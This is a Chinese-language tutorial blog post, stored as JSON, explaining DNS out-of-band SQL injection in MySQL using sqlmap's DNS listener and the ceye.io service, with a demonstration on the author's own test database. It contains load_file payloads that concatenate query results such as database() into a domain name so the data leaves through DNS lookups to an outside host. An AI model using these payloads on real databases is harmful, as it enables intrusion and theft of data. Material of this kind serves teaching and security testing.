{"title":"DNS注入原理解析(待整理)","slug":"网安大类/OWASPTOP/Inject-注入/DNS注入原理解析","date":"2019-08-13T05:36:30.000Z","updated":"2022-04-13T02:36:21.097Z","url":"2019/8-13-649.html","path":"api/articles/2019/8-13-649.html.json","covers":null,"content":"<p>为什么要使用DNS注入？</p>\n<p>盲注跑数据太慢的情况下，选择DNS注入是一个好办法</p>\n<p>DNS注入的原理？</p>\n<p>域名DNS指向的是我们服务器的域名，意味着解析域名时需向DNS服务器查询。通过递归查询可以获取数据库上的信息。要记住整个域名内的节点标签被限制在63个字符长度大小</p>\n<h2 id=\"DNS-注入场景\"><a href=\"#DNS-注入场景\" class=\"headerlink\" title=\"DNS 注入场景\"></a>DNS 注入场景</h2><h3 id=\"1-数据库注入\"><a href=\"#1-数据库注入\" class=\"headerlink\" title=\"1) 数据库注入\"></a>1) 数据库注入</h3><p>数据库在配置中允许域名解析时，到数据库中查看：</p>\n<p>show variables like ‘skip_name_resolve’; </p>\n<p>skip_name_resolve这个参数是禁止域名解析</p>\n<p>skip_name_resolve 为off时会进行域名解析</p>\n<p>情况一：</p>\n<p>1.首先我们服务器上安装sqlmap</p>\n<p>发现服务器已有2.6的python环境了 ▼</p>\n<p>直接pip install sqlmap，安装sqlmap▼</p>\n<ol start=\"2\">\n<li>接着上个步骤</li>\n</ol>\n<p>找到sqlmap根目录 下的dns.py</p>\n<p>cd/usr/lib/python2.6/site-packages/sqlmap/lib/request/</p>\n<p>注释：</p>\n<p>dns.py</p>\n<p>它的作用是监听53端口，先给它一个执行权限，+x</p>\n<p>注：这里笔者给了最大权限</p>\n<p>chmod 777 dns.py</p>\n<p>在mysql命令行执行 </p>\n<p>select load_file(“\\\\xxx.zka7.xyz\\txf”);  </p>\n<p>\\\\ 经过传输后会变成\\</p>\n<p>txf是域名的下级目录，可以随便构造</p>\n<p>执行后服务器就会有数据包（xxx.zka7.xyz）出现</p>\n<ol start=\"3\">\n<li><p>Sqlmap的自动化实现</p>\n</li>\n<li><p>在sqlmap中实现DNS注入加上参数–dns-domain=域名</p>\n</li>\n</ol>\n<ol start=\"2\">\n<li>服务器安装好sqlmap后运行dns.py</li>\n</ol>\n<ol start=\"3\">\n<li></li>\n</ol>\n<p>即可实现自动化</p>\n<p>情况二： 不买域名也不买服务器</p>\n<p>如何能在不想买域名也不想买服务器的情况下也玩一波DNS注入呢?</p>\n<p>其实有现成的服务：<a href=\"http://ceye.io\" target=\"_blank\" rel=\"noopener\">http://ceye.io</a>  </p>\n<p>有一个分配给你的二级域名▲</p>\n<p>在数据库中输入 </p>\n<p>select load_file(“\\\\tangxiaofeng.1odz7u.ceye.io\\aaa”); </p>\n<p>可以看到tangxiaofeng这个帅气的名字▲</p>\n<p>试一下拼接：</p>\n<p>首先本地选择一个表 use sqltest； </p>\n<p>接着 select load_file(concat(“\\\\“,(select database()),”.1odz7u.ceye.io\\txf”));</p>\n<p> 注：这里的sqltest是笔者自己建的表</p>\n<p>database 出来了</p>\n","comments":true,"excerpt":null,"categories":[{"name":"漏洞原理浅析","path":"api/categories/漏洞原理浅析.json"}],"tags":[{"name":"DNS","path":"api/tags/DNS.json"},{"name":"注入","path":"api/tags/注入.json"}]}